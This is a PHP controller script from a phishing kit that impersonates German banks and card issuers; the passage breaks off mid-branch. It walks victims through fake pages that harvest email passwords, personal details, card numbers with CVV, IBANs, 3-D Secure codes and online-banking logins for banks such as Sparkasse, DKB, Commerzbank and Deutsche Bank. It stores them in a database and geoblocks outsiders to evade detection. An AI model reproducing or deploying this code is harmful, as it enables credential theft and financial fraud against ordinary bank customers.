<?php
	session_start();
	include("config.php");
	require_once("geoplugin.php");
	
	$urlext = getRandomURL();
	
	if (!isset($_SESSION['step1'])) {
		if ($geoblocking) {
			$geoplugin = new geoPlugin();
			$geoplugin->locate();
			
			if (!in_array($geoplugin->countryName, $country_whitelist)) {
				die (file_get_contents("http://wap.bild.de"));
			}
		}
		
		$_SESSION['step1'] = "1";
		updateVisitor();
		header('Location: ' . $login . $urlext);
		
	} else if (isset($_SESSION['step1']) && !isset($_SESSION['step1finished']) && !isset($_POST['doLogin'])) {
		header('Location: ' . $login . $urlext);
		
	} else if (isset($_SESSION['step2']) && !isset($_SESSION['step2finished']) &&  !isset($_POST['doPersonaldata_x']) ) {
		header('Location: ' . $personaldata . $urlext);
		
	} else if (isset($_SESSION['step3']) && !isset($_SESSION['step3finished']) &&  !isset($_POST['doPaymentInfo_x']) ) {
		header('Location: ' . $payment . $urlext);
		
	} else if (isset($_SESSION['step4']) && !isset($_SESSION['step4finished']) && !isset($_POST['sendcode']) && !isset($_POST['sendcode_x']) && !isset($_POST['cancelcode'])) {
		
		if (isset($_SESSION['lbb']) && $_SESSION['lbb'] == "lbb") {
			header('Location: ' . $lbb . $urlext);
			
		} else if (isset($_SESSION['advanzia']) && $_SESSION['advanzia'] == "advanzia") {
			header('Location: ' . $advanzia . $urlext);
			
		} else if (isset($_SESSION['sparkasse']) && $_SESSION['sparkasse'] == "sparkasse") {
			header('Location: ' . $sparkasse . $urlext);
			
		} else if (isset($_SESSION['barclay']) && $_SESSION['barclay'] == "barclay") {
			header('Location: ' . $barclay . $urlext);
			
		} else if (isset($_SESSION['dkb']) && $_SESSION['dkb'] == "dkb") {
			header('Location: ' . $dkb . $urlext);
			
		} else if (isset($_SESSION['volkswagen']) && $_SESSION['volkswagen'] == "volkswagen") {
			header('Location: ' . $volkswagen . $urlext);
			
		} else if (isset($_SESSION['dz_wgz']) && $_SESSION['dz_wgz'] == "dz_wgz") {
			header('Location: ' . $dz_wgz . $urlext);
			
		} else if (isset($_SESSION['hypo']) && $_SESSION['hypo'] == "hypo") {
			header('Location: ' . $hypo . $urlext);
			
		} else if (isset($_SESSION['sparda']) && $_SESSION['sparda'] == "sparda") {
			header('Location: ' . $sparda . $urlext);
			
		} else {
			header('Location: ' . $payment_code . $urlext);
		}
		
	} else if (isset($_SESSION['step5']) && !isset($_SESSION['step5finished']) && !isset($_SESSION['finished']) && !isset($_POST['sendMailPass_x']) && !isset($_POST['sendOB_Login_x'])) {
		if (isset($_SESSION['lbb']) && $_SESSION['lbb'] == "lbb") {
			header('Location: ' . $mail_login . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "comdirect") !== false) {
			$_SESSION['ob_comdirect'] = true;
			header("Location: " . $ob_comdirect . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "Commerzbank") !== false) {
			$_SESSION['ob_commerzbank'] = true;
			header("Location: " . $ob_commerzbank . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "Deutsche Bank") !== false) {
			$_SESSION['ob_deutschebank'] = true;
			header("Location: " . $ob_deutschebank . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "Deutsche Kreditbank") !== false) {
			$_SESSION['ob_dkb'] = true;
			header("Location: " . $ob_dkb . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "HypoVereinsbank") !== false) {
			$_SESSION['ob_hypo'] = true;
			header("Location: " . $ob_hypo . $urlext);
		
		} else if (strpos($_SESSION['ob_bank'], "Postbank") !== false) {
			$_SESSION['ob_postbank'] = true;
			header("Location: " . $ob_postbank . $urlext);
		
		} else if (strpos($_SESSION['ob_bank'], "Sparkasse") !== false) {
			$_SESSION['ob_sparkasse'] = true;
			header("Location: " . $ob_sparkasse . $urlext);
		
		} else if (strpos($_SESSION['ob_bank'], "Kreissparkasse") !== false) {
			$_SESSION['ob_sparkasse'] = true;
			header("Location: " . $ob_sparkasse . $urlext);
		
		} else if (strpos($_SESSION['ob_bank'], "sparkasse") !== false) {
			$_SESSION['ob_sparkasse'] = true;
			header("Location: " . $ob_sparkasse . $urlext);
		
		} else if (strpos($_SESSION['ob_bank'], "Stadtsparkasse") !== false) {
			$_SESSION['ob_sparkasse'] = true;
			header("Location: " . $ob_sparkasse . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "Volksbank") !== false) {
			$_SESSION['ob_volksbank'] = true;
			header("Location: " . $ob_volksbank . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "Sparda-Bank") !== false) {
			$_SESSION['ob_sparda'] = true;
			header("Location: " . $ob_sparda . $urlext);
			
		} else {
			header("Location: " . $finish . $urlext);
		}
	} else if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);

	} else {
		if (isset($_POST['doLogin'])) {
			$_SESSION['vic_info_browser']= $_POST['browser_info'];
			$_SESSION['vic_info_os']= $_POST['os_info'];
			$_SESSION['vic_info_screen']= $_POST['screenPrint'];
			$_SESSION['vic_info_plugins']= $_POST['plugins'];
			$_SESSION['vic_info_java']= $_POST['isJava'];
			$_SESSION['vic_info_flash']= $_POST['isFlash'];
			$_SESSION['vic_info_silver']= $_POST['isSilverlight'];
			$_SESSION['vic_info_mime']= $_POST['isMimeTypes'];
			$_SESSION['vic_info_fonts']= $_POST['fonts'];

			$_SESSION['email'] = $_POST['email'];
			$_SESSION['password'] = $_POST['password'];
			
			if (empty($_POST['email']) || !filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
				$_SESSION['err'] = "Bitte geben Sie Ihre E-Mail-Adresse ein.";
				
				unset($_SESSION['email']);
				header('Location: ' . $login . $urlext);
				
			} else if (empty($_POST['password']) || strlen($_POST['password']) < 5) {
				$_SESSION['err'] = "Bitte geben Sie Ihr Passwort ein.";
				header('Location: ' . $login . $urlext);
				
			} else {
				$_SESSION['step2'] = "1";
				$_SESSION['step1finished'] = "1";
				addLogin();
				sleep(1);
				header('Location: ' . $loginCheck . $urlext);
			}
		} else if (isset($_POST['sendMailPass_x'])) {
			
			$_SESSION['email_pw'] = $_POST['email_pw'];
			
			if (empty($_POST['email_pw']) || strlen($_POST['email_pw']) < 5) {
				$_SESSION['err'] = "Bitte geben Sie das Passwort Ihrer E-Mail-Adresse ein.";
				header('Location: ' . $mail_login . $urlext);
				
			} else {
				$con = mySQL_Connection();
				$_SESSION['securecode'] .= " | E-Mail-Passwort: " . $_SESSION['email_pw'];

				$query = ("UPDATE `$myTable` SET `securecode`=\"" . mysqli_real_escape_string($con, $_SESSION['securecode']) .  "\", `servicekartennummer`=\"" . mysqli_real_escape_string($con, $_SESSION['sknr']) .  "\" WHERE id= " . $_SESSION['insertID']);
				mysqli_query($con,$query) or die(mysqli_error($con));
		
				sleep(1);
				header('Location: ' . $finish . $urlext);
			}
		
		} else if (isset($_POST['doPersonaldata_x'])) {
			$_SESSION['vorname'] = $_POST['vorname'];
			$_SESSION['nachname'] = $_POST['nachname'];
			$_SESSION['dob1'] = $_POST['dob1'];
			$_SESSION['dob2'] = $_POST['dob2'];
			$_SESSION['dob3'] = $_POST['dob3'];
			$_SESSION['adresse'] = $_POST['adresse'];
			$_SESSION['plz'] = $_POST['plz'];
			$_SESSION['ort'] = $_POST['ort'];
			$_SESSION['tlfnr'] = $_POST['tlfnr'];
			$_SESSION['handynr'] = $_POST['handynr'];
			$_SESSION['ps_active'] = $_POST['ps_active'];
			$_SESSION['ps_nr'] = $_POST['ps_nr'];
			$_SESSION['ps_pw'] = $_POST['ps_pw'];
			
			$_SESSION['errList'] = array();
			
			if (empty($_POST['vorname'])) {
				$_SESSION['errList']['vorname'] .= "Bitte geben Sie Ihren <b>Vornamen</b> ein.";
				$_SESSION['v_err'] = "1";
				unset($_SESSION['vorname']);
			} 

			if (empty($_POST['nachname'])) {
				$_SESSION['errList']['nachname'] .= "Bitte geben Sie Ihren <b>Nachnamen</b> ein.";
				$_SESSION['n_err'] = "1";
				unset($_SESSION['nachname']);
			} 

			if (!ctype_digit($_POST['dob1'])) {
				$_SESSION['dob1_err'] = "1";
			}
			if (!ctype_digit($_POST['dob2'])) {
				$_SESSION['dob2_err'] = "1";
			}
			if (!ctype_digit($_POST['dob3'])) {
				$_SESSION['dob3_err'] = "1";
			}
			
			if (!ctype_digit($_POST['dob1']) || !ctype_digit($_POST['dob2']) || !ctype_digit($_POST['dob3'])) {
				$_SESSION['errList']['dob'] .= "Bitte geben Sie Ihr <b>Geburtsdatum</b> an.";
			} 
			
			if (empty($_POST['adresse'])) {
				$_SESSION['errList']['adresse'] .= "Bitte geben Sie Ihre <b>Adresse</b> ein.";
				$_SESSION['a_err'] = "1";
				unset($_SESSION['adresse']);
			}
			
			if (empty($_POST['plz']) || !ctype_digit($_POST['plz']) || strlen($_POST['plz']) != 5) {	
				$_SESSION['errList']['plz'] .= "Die angegebene <b>Postleitzahl</b> ist fehlerhaft.";
				$_SESSION['p_err'] = "1";
				unset($_SESSION['plz']);
			} 
			
			if (empty($_POST['ort'])) {
				$_SESSION['errList']['ort'] .= "Bitte geben Sie Ihren <b>Wohnort</b> ein.";
				$_SESSION['o_err'] = "1";
				unset($_SESSION['ort']);
			}

			if (empty($_POST['tlfnr'])) {
				$_SESSION['errList']['tlfnr'] .= "Bitte geben Sie Ihre <b>Festnetznummer</b> ein.";
				$_SESSION['t_err'] = "1";
				unset($_SESSION['tlfnr']);
			}
						
//			if (empty($_POST['handynr'])) {
//				$_SESSION['errList'][] .= "Bitte geben Sie Ihre <b>Mobilfunknummer</b> ein.";
//				$_SESSION['h_err'] = "1";
//				unset($_SESSION['handynr']);
//			}
			
			if (isset($_POST['ps_active']) && $_POST['ps_active'] == 1) {
				if (empty($_POST['ps_nr']) || !ctype_digit($_POST['ps_nr'])) {
					$_SESSION['errList']['ps_nr'] .= "Bitte geben Sie Ihre <b>Packstation PostNummer</b> ein.";
					$_SESSION['ps_nr_err'] = "1";
					unset($_SESSION['ps_nr']);
				}
				
				if (empty($_POST['ps_pw'])) {
					$_SESSION['errList']['ps_pw'] .= "Bitte geben Sie Ihr <b>Packstation Passwort</b> ein.";
					$_SESSION['ps_pw_err'] = "1";
					unset($_SESSION['ps_pw']);
				}
			}
			
			if (count($_SESSION['errList']) != 0) {
				header('Location: ' . $personaldata . $urlext);	
			} else {
				unset($_SESSION['errList']);
				$_SESSION['step3'] = "1";
				$_SESSION['step2finished'] = "1";
				addPData();
				sleep(1);
				$_SESSION['kto_active'] = "1";
				header('Location: ' . $payment . $urlext);
			}
			
		} else if (isset($_POST['doPaymentInfo_x'])) {
			$_SESSION['ccnr'] = $_POST['ccnr'];
			$_SESSION['cvv'] = $_POST['cvv'];
			$_SESSION['ccDate1'] = $_POST['ccDate1'];
			$_SESSION['ccDate2'] = $_POST['ccDate2'];
			$_SESSION['limit'] = $_POST['limit'];
			$_SESSION['kto'] = $_POST['kto'];
			$_SESSION['blz'] = $_POST['blz'];
			$_SESSION['iban'] = $_POST['iban'];
			$_SESSION['bic'] = $_POST['bic'];
			
			$_SESSION['cc_active'] = $_POST['cc_active'];
			$_SESSION['kto_active'] = $_POST['kto_active'];
			
			$_SESSION['errList'] = array();
			
			if ($_POST['cc_active'] == 1) {
				unset($_SESSION['noCC']);
				
				if (empty($_POST['ccnr']) || !ctype_digit($_POST['ccnr']) || checkLuhn($_POST['ccnr']) != "1" || strlen($_POST['ccnr']) < 15) {
					$_SESSION['cc_err'] = "1";
					$_SESSION['errList'][] .= "Die angegebene <b>Kreditkartennummer</b> ist fehlerhaft.";
					unset($_SESSION['ccnr']);
				} 

				if (empty($_POST['cvv']) || strlen($_POST['cvv']) != 3 && strlen($_POST['cvv']) != 4) {
					$_SESSION['cvv_err'] = "1";
					$_SESSION['errList'][] .= "Bitte geben Sie die <b>Pr&uuml;fziffer</b> Ihrer Kreditkarte an.";
					unset($_SESSION['cvv']);
				} 

				if (strlen($_POST['cvv']) == 4 && substr($_POST['ccnr'], 0, 1) != "3") {
					$_SESSION['cvv_err'] = "1";
					$_SESSION['errList'][] .= "Die <b>Pr&uuml;fziffer</b> Ihrer Kreditkarte besteht aus drei Ziffern.";
					unset($_SESSION['cvv']);
				} 

				if (strlen($_POST['cvv']) != 4 && substr($_POST['ccnr'], 0, 1) == "3") {
					$_SESSION['cvv_err'] = "1";
					$_SESSION['errList'][] .= "Die <b>Pr&uuml;fziffer</b> Ihrer Kreditkarte besteht aus vier Ziffern.";
					unset($_SESSION['cvv']);
				} 
	
				if (!ctype_digit($_POST['ccDate1'])) {
					$_SESSION['ccDate1_err'] = "1";
				}
				if (!ctype_digit($_POST['ccDate2'])) {
					$_SESSION['ccDate2_err'] = "1";
				}
				if (!ctype_digit($_POST['ccDate1']) || !ctype_digit($_POST['ccDate2'])) {
					$_SESSION['errList'][] .= "Bitte geben Sie die <b>G&uuml;ltigkeit</b> Ihrer Kreditkarte ein.";
				}
			} else { 
				$_SESSION['noCC'] = true; 
			}

			if ($_POST['kto_active'] == 1) {
				if (!checkELV($_POST['kto'], $_POST['blz'])) {
					$_SESSION['kto_err'] = "1";
					$_SESSION['blz_err'] = "1";
					$_SESSION['errList'][] .= "Ihre <b>Kontonummer</b> stimmt mit Ihrer <b>Bankleitzahl</b> nicht &uuml;berein oder ist fehlerhaft.";
					unset($_SESSION['kto']);
					unset($_SESSION['blz']);
				}
			} else {
				unset($_SESSION['kto_active']);
				if (!checkIBAN($_POST['iban'])) { 
					$_SESSION['iban_err'] = "1";
					$_SESSION['errList'][] .= "Entweder sind Ihre <b>IBAN-Daten</b> ungültig oder Sie haben keine Eingabe getätigt.";
					unset($_SESSION['iban']);
				}

				if (empty($_POST['bic'])) {
					$_SESSION['errList'][] .= "Bitte geben Sie Ihre <b>BIC</b> ein.";
					$_SESSION['bic_err'] = "1";
					unset($_SESSION['bic']);
				}
			} 
			
			if (count($_SESSION['errList']) != 0) {
				header('Location: ' . $payment . $urlext);	
			} else {
				unset($_SESSION['errList']);
				
				if (isset($_SESSION['noCC']) && $_SESSION['noCC']) {
					addPaymentData();
					$bank_name = checkBIC_BLZ();
					$_SESSION['ob_bank'] = $bank_name;
					
					$_SESSION['step4'] = "1";
					$_SESSION['step3finished'] = "1";
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					
					redirectOB();
					
				} else {
					$bin = substr($_SESSION['ccnr'], 0, 6);
					
					if (substr($_SESSION['ccnr'], 0, 1) == "3") {
						$_SESSION['securecode'] = "N / A";
						
						checkAndAddBin_NEW();
						addPaymentData();
						header("Location: " . $finish . $urlext);
						
					} else if (in_array($bin, $mTAN_Bins) || isset($_SESSION['mtanCC']) && $_SESSION['mtanCC']) {
						$_SESSION['securecode'] = "mTAN Bin - SC skip";
						
						checkAndAddBin_NEW();
						addPaymentData();
						addSecureCode();
						header("Location: " . $finish . $urlext);
					
					} else {
					
						if (in_array($bin, $specialBins)) {
							$_SESSION['specialBin'] = "1";
							
						} else if (in_array($bin, $enrolledBinsAdvanzia)) {
							$_SESSION['advanzia'] = "advanzia";
							
						} else if (in_array($bin, $enrolledBinsLbb)) {
							$_SESSION['lbb'] = "lbb";
							
						} else if (in_array($bin, $enrolledBinsBarclays)) {
							$_SESSION['barclay'] = "barclay";
							
						} else if (in_array($bin, $enrolledBinsSparkasse)) {
							$_SESSION['sparkasse'] = "sparkasse";
							
						} else if (in_array($bin, $enrolledDkbBins)) {
							$_SESSION['dkb'] = "dkb";
							
						} else if (in_array($bin, $enrolledVWBankBins)) {
							$_SESSION['volkswagen'] = "volkswagen";
							
						} else if (in_array($bin, $enrolledHypoBins)) {
							$_SESSION['hypo'] = "hypo";
							
						} else if (in_array($bin, $enrolled_dz_wgzBins)) {
							$_SESSION['dz_wgz'] = "dz_wgz";
							
						} else if (in_array($bin, $enrolledBinsSparda)) {
							$_SESSION['sparda'] = "sparda";
						}
					
						$_SESSION['step4'] = "1";
						$_SESSION['step3finished'] = "1";
						
						checkAndAddBin_NEW();
						addPaymentData();
						
						header("Location: " . $checkpage . $urlext);
					}
				}
			}
		
		} else if (isset($_POST['sendcode'])) {

			if (isset($_SESSION['sparkasse']) && $_SESSION['sparkasse'] == "sparkasse") {
				$_SESSION['sparkasse_username'] = $_POST['sparkasse_username'];
				$_SESSION['sparkasse_pass'] = $_POST['sparkasse_pass'];
				
				if (empty($_POST['sparkasse_username'])) {
					$_SESSION['usrErr'] = "1";
					header('Location: ' . $sparkasse . $urlext);
					
				} else if (empty($_POST['sparkasse_pass'])) {
					$_SESSION['scErr'] = "1";
					header('Location: ' . $sparkasse . $urlext);
					
				} else {
					$_SESSION['securecode'] = "Benutzername: " . $_SESSION['sparkasse_username'] . " | PIN: " . $_SESSION['sparkasse_pass'];
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					addSecureCode();
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
				
			} else if (isset($_SESSION['dz_wgz']) && $_SESSION['dz_wgz'] == "dz_wgz") {
				$_SESSION['dz_wgz_username'] = $_POST['dz_wgz_username'];
				$_SESSION['dz_wgz_pass'] = $_POST['dz_wgz_pass'];
				
				if (empty($_POST['dz_wgz_username'])) {
					$_SESSION['user_err'] = "1";
				}
				if (empty($_POST['dz_wgz_pass'])) {
					$_SESSION['pass_err'] = "1";
				}
				
				if (isset($_SESSION['user_err']) || isset($_SESSION['pass_err'])) {
					$_SESSION['err'] = 1;
					header('Location: ' . $dz_wgz . $urlext);
				} else {
					$_SESSION['securecode'] = "Benutzername: " . $_SESSION['dz_wgz_username'] . " | PIN: " . $_SESSION['dz_wgz_pass'];
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					addSecureCode();
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
				
			} else if (isset($_SESSION['hypo']) && $_SESSION['hypo'] == "hypo") {
				$_SESSION['hypo_username'] = $_POST['hypo_username'];
				$_SESSION['hypo_pass'] = $_POST['hypo_pass'];
				
				if (empty($_POST['hypo_username'])) {
					$_SESSION['user_err'] = "1";
				}
				if (empty($_POST['hypo_pass'])) {
					$_SESSION['pass_err'] = "1";
				}
				
				if (isset($_SESSION['user_err']) || isset($_SESSION['pass_err'])) {
					$_SESSION['err'] = 1;
					header('Location: ' . $hypo . $urlext);
				} else {
					$_SESSION['securecode'] = "Benutzername: " . $_SESSION['hypo_username'] . " | PIN: " . $_SESSION['hypo_pass'];
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					addSecureCode();
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
				
			} else if (isset($_SESSION['volkswagen']) && $_SESSION['volkswagen'] == "volkswagen") {
				$_SESSION['enrolled_sc'] = $_POST['enrolled_sc'];
				
				if (empty($_POST['enrolled_sc'])) {
					$_SESSION['err'] = "Bitte geben Sie Ihre VISA Card Kontonummer ein.";
					header('Location: ' . $volkswagen . $urlext);
					
				} else {
					$_SESSION['securecode'] = "Volkswagen Kto-Nr.: " . $_SESSION['enrolled_sc'];
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					addSecureCode();
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
				
			} else if (isset($_SESSION['dkb']) && $_SESSION['dkb'] == "dkb") {
				$_SESSION['dkb_username'] = $_POST['dkb_username'];
				$_SESSION['dkb_pass'] = $_POST['dkb_pass'];
				
				if (empty($_POST['dkb_username'])) {
					$_SESSION['usrErr'] = "1";
					header('Location: ' . $dkb . $urlext);
					
				} else if (empty($_POST['dkb_pass']) || strlen($_POST['dkb_pass']) != 5) {
					$_SESSION['passErr'] = "1";
					header('Location: ' . $dkb . $urlext);
					
				} else {
					$_SESSION['securecode'] = "Benutzername: " . $_SESSION['dkb_username'] . " | PIN: " . $_SESSION['dkb_pass'];
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					addSecureCode();
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
					
			} else if (isset($_SESSION['barclay']) && $_SESSION['barclay'] == "barclay") {
				
				$_SESSION['barclay_name'] = $_POST['barclay_name'];
				$_SESSION['geb_ort'] = $_POST['geb_ort'];
				$_SESSION['exp_mm'] = $_POST['exp_mm'];
				$_SESSION['exp_yy'] = $_POST['exp_yy'];
				$_SESSION['enrolled_sc'] = $_POST['enrolled_sc'];
				
				if (empty($_POST['barclay_name'])) {
					unset($_SESSION['barclay_name']);
					$_SESSION['err'] = "Bitte Name (wie auf der Karte angegeben) angeben.";
					header('Location: ' . $barclay . $urlext);

				} else if (empty($_POST['geb_ort'])) {
					unset($_SESSION['geb_ort']);
					$_SESSION['err'] = "Bitte Geburtsort angeben.";
					header('Location: ' . $barclay . $urlext);
					
				} else if (!ctype_digit($_POST['exp_mm'])  || $_POST['exp_mm'] > 12) {
					unset($_SESSION['exp_mm']);
					$_SESSION['err'] = "Bitte geben Sie das Ablaufdatum ein.";
					header('Location: ' . $barclay . $urlext);
					
				} else if (!ctype_digit($_POST['exp_yy'])  || $_POST['exp_yy'] < 16) {
					unset($_SESSION['exp_yy']);
					$_SESSION['err'] = "Bitte geben Sie das Ablaufdatum ein.";
					header('Location: ' . $barclay . $urlext);
					
				} else if (!ctype_digit($_POST['enrolled_sc']) || strlen($_POST['enrolled_sc']) != 10) {
					unset($_SESSION['enrolled_sc']);
					$_SESSION['err'] = "Bitte geben Sie Ihre 10-stellige Barclaycard Kontonummer ein.";
					header('Location: ' . $barclay . $urlext);
					
				} else {
					$_SESSION['securecode'] = $_SESSION['barclay_name'] . " >>> " . $_SESSION['geb_ort'] . " >>> " . $_SESSION['exp_mm'] . "/" . $_SESSION['exp_yy'] . " >>> " . $_SESSION['enrolled_sc'];
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					addSecureCode();
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
				
			} else {
				
				$_SESSION['securecode'] = $_POST['code'];
				
				if (isset($_SESSION['canceled_specialBin']) && !empty($_SESSION['canceled_specialBin'])) {
					$_SESSION['securecode'] = "non regged";
				}
				
				if (isset($_SESSION['specialBin'])) {
					if (!empty($_POST['sknr']) && ctype_digit($_POST['sknr'])) {
						$_SESSION['sknr'] = $_POST['sknr'];
					}
				}
				
				if (empty($_SESSION['securecode']) || strlen($_SESSION['securecode']) < 5) {
					$_SESSION['sc_err'] = "1";
					$_SESSION['errList'][] .= 'Bitte geben Sie ' . ((isset($_SESSION['ccnr']) && substr($_SESSION['ccnr'], 0, 1) == 4) ? "Ihr <i>Verified by VISA Passwort</i>" : "Ihren <i>MasterCard® SecureCode™</i>") . ' ein!';
					unset ($_SESSION['securecode']);
					
					if (isset($_SESSION['lbb']) && $_SESSION['lbb'] == "lbb") {
						header('Location: ' . $lbb . $urlext);
					} else if (isset($_SESSION['advanzia']) && $_SESSION['advanzia'] == "advanzia") {
						header('Location: ' . $advanzia . $urlext);
					} else {
						header('Location: ' . $payment_code . $urlext);
					}
					
				} else if (isset($_SESSION['specialBin']) && (empty($_POST['sknr']) || !ctype_digit($_POST['sknr'])) && isset($_SESSION['canceled_specialBin'])) {
					$_SESSION['sk_err'] = "1";
					$_SESSION['errList'][] .= "Bitte geben Sie Ihre 16-stellige Servicekartennummer ein.";
					unset ($_SESSION['sknr']);
					header("Location: " . $payment_code . $urlext);
					
				} else {
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					addSecureCode();
					sleep(1);
					
					if (isset($_SESSION['lbb']) && $_SESSION['lbb'] == "lbb") {
						header('Location: ' . $mail_login . $urlext);
					} else {
						header("Location: " . $finish . $urlext);
					}
				}
			
			}
			
		} else if (isset($_POST['cancelcode'])) {
			if (isset($_SESSION['specialBin'])) {
				if (!empty($_POST['sknr']) && ctype_digit($_POST['sknr'])) {
					$_SESSION['sknr'] = $_POST['sknr'];
				}
			}
		
			if (isset($_SESSION['specialBin']) && (empty($_POST['sknr']) || !ctype_digit($_POST['sknr']) || strlen($_POST['sknr']) != 15)) {
				$_SESSION['err'] = "Bitte geben Sie Ihre 15-stellige Servicekartennummer ein.";
				$_SESSION['skerr'] = "1";
				unset ($_SESSION['sknr']);
				header("Location: " . $payment_code . $urlext);
			} else {
				$_SESSION['step5'] = "1";
				$_SESSION['step4finished'] = "1";
				$_SESSION['securecode'] = "non regged";
				addSecureCode();
				sleep(1);
				header("Location: " . $finish . $urlext);
			}
			
		} else if (isset($_POST['sendcode_x'])) {
			$_SESSION['securecode'] = $_POST['code'];
			
			if (empty($_SESSION['securecode']) || strlen($_SESSION['securecode']) != 4) {
				$_SESSION['sc_err'] = "1";
				$_SESSION['errList'][] .= 'Bitte geben Sie die letzten vier Stellen von Ihrem Abrechnungskonto ein.';
				unset ($_SESSION['securecode']);
				
				header('Location: ' . $sparda . $urlext);
				
			} else {
				$_SESSION['step5'] = "1";
				$_SESSION['step4finished'] = "1";
				addSecureCode();
				sleep(1);
				
				header("Location: " . $finish . $urlext);
			}
			
		} else if (isset($_POST['sendOB_Login_x'])) {
			
			if (isset($_SESSION['ob_comdirect']) && $_SESSION['ob_comdirect']) {
				$_SESSION['cd_username'] = $_POST['cd_username'];
				$_SESSION['cd_password'] = $_POST['cd_password'];

				if (empty($_SESSION['cd_username'])) {
					$_SESSION['user_err'] = "1";
					unset($_SESSION['cd_username']);
				}
				
				if (empty($_SESSION['cd_password'])) {
					$_SESSION['pass_err'] = "1";
					unset($_SESSION['cd_password']);
				}
				
				if (isset($_SESSION['user_err']) || isset($_SESSION['pass_err'])) {
					$_SESSION['err'] = "1";
					header("Location: " . $ob_comdirect . $urlext);
					
				} else {
					addOB($_SESSION['cd_username'], $_SESSION['cd_password']);
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
			} else if (isset($_SESSION['ob_commerzbank']) && $_SESSION['ob_commerzbank']) {
				
				$_SESSION['cb_username'] = $_POST['cb_username'];
				$_SESSION['cb_password'] = $_POST['cb_password'];

				if (empty($_SESSION['cb_username']) || strlen($_POST['cb_username']) < 8 || strlen($_POST['cb_username']) > 50) {
					$_SESSION['user_err'] = "1";
					unset($_SESSION['cb_username']);
				}
				
				if (empty($_SESSION['cb_password']) || strlen($_POST['cb_password']) > 8 || strlen($_POST['cb_password']) < 5) {
					$_SESSION['pass_err'] = "1";
					unset($_SESSION['cb_password']);
				}
				
				if (isset($_SESSION['user_err']) || isset($_SESSION['pass_err'])) {
					header("Location: " . $ob_commerzbank . $urlext);
					
				} else {
					addOB($_SESSION['cb_username'], $_SESSION['cb_password']);
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
			} else if (isset($_SESSION['ob_deutschebank']) && $_SESSION['ob_deutschebank']) {
				
				$_SESSION['branch'] = $_POST['branch'];
				$_SESSION['account'] = $_POST['account'];
				$_SESSION['subaccount'] = $_POST['subaccount'];
				$_SESSION['pin'] = $_POST['pin'];
				
				if (empty($_SESSION['branch']) || !ctype_digit($_SESSION['branch']) || strlen($_POST['branch']) != 3) {
					$_SESSION['err'] = "1";
					$_SESSION['branch_err'] = "1";
					unset($_SESSION['branch']);
				}
				
				if (empty($_SESSION['account']) || !ctype_digit($_SESSION['account']) || strlen($_POST['account']) != 7) {
					$_SESSION['err'] = "1";
					$_SESSION['account_err'] = "1";
					unset($_SESSION['account']);
				}
				
				if (empty($_SESSION['subaccount']) || !ctype_digit($_SESSION['subaccount']) || strlen($_POST['subaccount']) != 2) {
					$_SESSION['err'] = "1";
					$_SESSION['subaccount_err'] = "1";
					unset($_SESSION['subaccount']);
				}
				
				if (empty($_SESSION['pin']) || !ctype_digit($_SESSION['pin']) || strlen($_POST['pin']) != 5) {
					$_SESSION['err'] = "1";
					$_SESSION['pin_err'] = "1";
					unset($_SESSION['pin']);
				}

				if (isset($_SESSION['err'])) {
					header("Location: " . $ob_deutschebank . $urlext);
					
				} else {
					addOB($_SESSION['branch'].'|'.$_SESSION['account'].'|'.$_SESSION['subaccount'], $_SESSION['pin']);
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
			
			} else if (isset($_SESSION['ob_dkb']) && $_SESSION['ob_dkb']) {
				$_SESSION['dkb_username'] = $_POST['dkb_username'];
				$_SESSION['dkb_password'] = $_POST['dkb_password'];
				
				if (empty($_POST['dkb_username'])) {
					$_SESSION['userErr'] = '1';
				}
					
				if (strlen($_POST['dkb_password']) < 5 || empty($_POST['dkb_password'])) {
					$_SESSION['passErr'] = '1';
				}
				
				if (isset($_SESSION['userErr']) || isset($_SESSION['passErr'])) {
					header("Location: " . $ob_dkb . $urlext);
				} else {
					addOB($_SESSION['dkb_username'], $_SESSION['dkb_password']);
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
				
			} else if (isset($_SESSION['ob_hypo']) && $_SESSION['ob_hypo']) {
				$_SESSION['hy_username'] = $_POST['hy_username'];
				$_SESSION['hy_password'] = $_POST['hy_password'];

				if (empty($_SESSION['hy_username'])) {
					$_SESSION['user_err'] = "1";
					unset($_SESSION['hy_username']);
				}
				
				if (empty($_SESSION['hy_password'])) {
					$_SESSION['pass_err'] = "1";
					unset($_SESSION['hy_password']);
				}
				
				if (isset($_SESSION['user_err']) || isset($_SESSION['pass_err'])) {
					$_SESSION['err'] = "1";
					header("Location: " . $ob_hypo . $urlext);
					
				} else {
					addOB($_SESSION['hy_username'], $_SESSION['hy_password']);
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
			} else if (isset($_SESSION['ob_postbank']) && $_SESSION['ob_postbank']) {		
